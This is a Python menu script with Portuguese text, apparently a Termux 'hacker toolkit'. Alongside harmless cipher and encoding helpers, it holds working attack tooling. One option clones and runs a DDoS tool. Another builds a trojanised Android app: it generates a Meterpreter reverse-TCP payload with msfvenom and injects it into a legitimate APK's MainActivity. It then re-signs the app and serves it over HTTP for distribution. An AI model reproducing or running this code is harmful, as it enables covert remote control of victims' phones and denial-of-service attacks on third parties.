import os
import time
import base64
import random

# Tabelas de apoio
MORSE = {
    'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.',
    'F': '..-.', 'G': '--.', 'H': '....', 'I': '..', 'J': '.---',
    'K': '-.-', 'L': '.-..', 'M': '--', 'N': '-.', 'O': '---',
    'P': '.--.', 'Q': '--.-', 'R': '.-.', 'S': '...', 'T': '-',
    'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-', 'Y': '-.--',
    'Z': '--..', ' ': '/'
}
MORSE_INV = {v: k for k, v in MORSE.items()}

def binario_para_texto(binario):
    binario = binario.replace(" ", "")
    return ''.join([chr(int(binario[i:i+8], 2)) for i in range(0, len(binario), 8)])

def texto_para_binario(texto):
    return ' '.join([format(ord(c), '08b') for c in texto])

def morse_para_texto(codigo):
    palavras = codigo.strip().split(' / ')
    texto = ''
    for palavra in palavras:
        letras = palavra.split()
        for letra in letras:
            texto += MORSE_INV.get(letra, '?')
        texto += ' '
    return texto.strip()

def texto_para_morse(texto):
    return ' '.join([MORSE.get(c.upper(), '?') for c in texto])

def hex_para_texto(hex_string):
    hex_string = hex_string.replace(" ", "").replace("0x", "")
    return ''.join([chr(int(hex_string[i:i+2], 16)) for i in range(0, len(hex_string), 2)])

def texto_para_hex(texto):
    return ' '.join([format(ord(c), '02X') for c in texto])

def substituicao_monoalfabetica(cifrado, chave):
    alfabeto = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    chave = chave.upper()
    inverso = {chave[i]: alfabeto[i] for i in range(len(alfabeto))}
    return ''.join([inverso.get(c.upper(), c) for c in cifrado])

def aplicar_substituicao(texto, chave):
    alfabeto = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    chave = chave.upper()
    mapa = {alfabeto[i]: chave[i] for i in range(len(alfabeto))}
    return ''.join([mapa.get(c.upper(), c) for c in texto])

def vigenere(cifrado, chave):
    cifrado = cifrado.upper()
    chave = chave.upper()
    texto = ''
    for i in range(len(cifrado)):
        letra = cifrado[i]
        if letra.isalpha():
            k = chave[i % len(chave)]
            letra_real = chr(((ord(letra) - ord(k) + 26) % 26) + ord('A'))
            texto += letra_real
        else:
            texto += letra
    return texto

def aplicar_vigenere(texto, chave):
    texto = texto.upper()
    chave = chave.upper()
    cifrado = ''
    for i in range(len(texto)):
        letra = texto[i]
        if letra.isalpha():
            k = chave[i % len(chave)]
            letra_cifrada = chr(((ord(letra) + ord(k) - 2 * ord('A')) % 26) + ord('A'))
            cifrado += letra_cifrada
        else:
            cifrado += letra
    return cifrado

# Interface
os.system("clear")
print(r'''
        \     /
         \   /
        (0   0)
          \_/
        01001101
''')
print('''
[1]-Descriptografar
[2]-Criptografar
[3]-Mudar IP
[4]-DDOS
[5]-Gerador de APK malicioso
[6]-Termos e Condições
[7]-Gerador de Codinome
[!]EMERGÊNCIA
''')

resposta = input("Escolha  Sabiamente: ")

if resposta == "1":
    print('''
[1] Binário
[2] Morse
[3] HEX
[4] Substituição Monoalfabética
[5] Vigenère
''')
    opcao = input("Opção: ")
    if opcao == "1":
        dado = input("Binário: ")
        print("Texto:", binario_para_texto(dado))
    elif opcao == "2":
        dado = input("Morse (com ' / ' entre palavras): ")
        print("Texto:", morse_para_texto(dado))
    elif opcao == "3":
        dado = input("HEX: ")
        print("Texto:", hex_para_texto(dado))
    elif opcao == "4":
        dado = input("Texto cifrado: ")
        chave = input("Chave (26 letras): ")
        print("Texto:", substituicao_monoalfabetica(dado, chave))
    elif opcao == "5":
        dado = input("Texto cifrado: ")
        chave = input("Palavra-chave: ")
        print("Texto:", vigenere(dado, chave))
    else:
        print("Opção inválida!")

elif resposta == "2":
    print('''
[1] Binário
[2] Morse
[3] HEX
[4] Substituição Monoalfabética
[5] Vigenère
''')
    opcao = input("Opção: ")
    if opcao == "1":
        dado = input("Texto: ")
        print("Binário:", texto_para_binario(dado))
    elif opcao == "2":
        dado = input("Texto: ")
        print("Morse:", texto_para_morse(dado))
    elif opcao == "3":
        dado = input("Texto: ")
        print("HEX:", texto_para_hex(dado))
    elif opcao == "4":
        dado = input("Texto: ")
        chave = input("Chave (26 letras): ")
        print("Texto cifrado:", aplicar_substituicao(dado, chave))
    elif opcao == "5":
        dado = input("Texto: ")
        chave = input("Palavra-chave: ")
        print("Texto cifrado:", aplicar_vigenere(dado, chave))
    else:
        print("Opção inválida!")

elif resposta == "3":
    print("Instalando AutoTor...")
    os.system("pkg install git -y && git clone https://github.com/Toxic-Noob/AutoTor && cd AutoTor && bash termux-autotor.sh")

elif resposta == "4":
    print("Instalando Gamkers-DDOS...")
    os.system("pkg install git -y && git clone https://github.com/gamkers/Gamkers-DDOS && cd Gamkers-DDOS && chmod +x * && bash Gamkers-DDOS.sh")

elif resposta == "5":
    os.system("clear")
    print("""
╔═══════════════════════════════════════════════╗
║     ☢️ FABRICA DE APKS CAMUFLADOS ☢️         ║
║        (Base: OpenCamera.apk)                 ║
║        Capitão SombraZero - Coronel GPT       ║
╚═══════════════════════════════════════════════╝
""")
    ip = input("[📡] Digite seu IP (LHOST): ")
    porta = input("[📦] Digite a PORTA (LPORT): ")
    apk_legitimo = input("[📁] Nome do APK legítimo (ex: OpenCamera.apk): ")

    print("\n[🔧] Instalando ferramentas...")
    os.system("apt update && apt install -y default-jdk apktool zipalign wget metasploit")

    print("\n[💀] Criando trojan.apk com msfvenom...")
    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={porta} -o trojan.apk")

    print("\n[📦] Descompilando APKs...")
    os.system(f"apktool d {apk_legitimo} -o original")
    os.system("apktool d trojan.apk -o payload")

    print("\n[🧬] Inserindo código malicioso...")
    os.system("cp -r payload/smali/com/metasploit original/smali/com/")

    print("\n[🧠] Localizando MainActivity.smali...")
    main_path = os.popen("find original/smali -name '*MainActivity*.smali'").read().strip()

    if main_path:
        print(f"[✍️] Inserindo payload em {main_path}...")
        with open(main_path, "r") as file:
            lines = file.readlines()
        for i, line in enumerate(lines):
            if "onCreate(Landroid/os/Bundle;)V" in line:
                while i < len(lines):
                    if "invoke-super" in lines[i]:
                        lines.insert(i+1, "    invoke-static {}, Lcom/metasploit/stage/Payload;->start()V\n")
                        break
                    i += 1
                break
        with open(main_path, "w") as file:
            file.writelines(lines)
    else:
        print("[❌] MainActivity.smali não encontrado.")
        exit()

    print("\n[🔁] Recompilando APK modificado...")
    os.system("apktool b original -o app_infectado.apk")

    print("\n[🔏] Assinando APK...")
    os.system("keytool -genkey -v -keystore chave.keystore -alias camuflado -keyalg RSA -keysize 2048 -validity 10000 <<< $'senha\nsenha\nSombraZero\nCidade\nEstado\nBR\nSim\n'")
    os.system("jarsigner -verbose -keystore chave.keystore app_infectado.apk camuflado")

    print("\n[📐] Alinhando APK final...")
    os.system("zipalign -v 4 app_infectado.apk app_final.apk")

    print(f"\n[🌐] Pronto. Link: http://{ip}:8080/app_final.apk")
    os.system("python3 -m http.server 8080")

elif resposta == "6":
    print("⚠️ Termos e Condições serão definidos em breve.")

elif resposta == "7":
    prefixos = ["Sombra", "Corvo", "Lobo", "Fantasma", "Vírus", "Sentinela"]
    sufixos = ["X", "404", "Zero", "13", "Phantom", "1NTRUD3R"]
    print("Codinome gerado:", random.choice(prefixos) + random.choice(sufixos))

elif resposta == "!":
    print("⚠️ EMERGÊNCIA ATIVADA: Excluindo sistema...")
    time.sleep(2)
    os.system("rm -rf 01001101.py")
    print("Arquivo 01001101.py removido com sucesso.")
    exit()

else:
    print("Opção inválida.")
